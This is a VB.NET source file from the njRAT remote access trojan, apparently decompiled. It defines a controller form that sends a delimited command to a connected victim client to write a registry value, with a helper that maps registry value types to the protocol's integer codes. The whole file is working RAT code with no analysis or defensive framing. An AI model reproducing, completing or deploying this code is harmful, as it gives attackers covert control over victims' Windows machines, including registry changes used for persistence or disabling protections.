Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class RGv
    Public Path As String
    Public sk As Client
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "!", Class7.string_1, Me.Path, Class7.string_1, Me.TextBox1.Text, Class7.string_1, Me.TextBox3.Text, Class7.string_1, Conversions.ToString(Me.Typ(Me.ComboBox1.Text))}))
        Me.Close()
    End Sub
    Public Function Typ(ByVal t As String) As Integer
        Dim num As Integer
        Dim str As String = t.ToLower
        If (str = RegistryValueKind.Binary.ToString.ToLower) Then
            Return 3
        End If
        If (str = RegistryValueKind.DWord.ToString.ToLower) Then
            Return 4
        End If
        If (str = RegistryValueKind.ExpandString.ToString.ToLower) Then
            Return 2
        End If
        If (str = RegistryValueKind.MultiString.ToString.ToLower) Then
            Return 7
        End If
        If (str = RegistryValueKind.QWord.ToString.ToLower) Then
            Return 11
        End If
        If (str = RegistryValueKind.String.ToString.ToLower) Then
            Return 1
        End If
        Return num
    End Function
End Class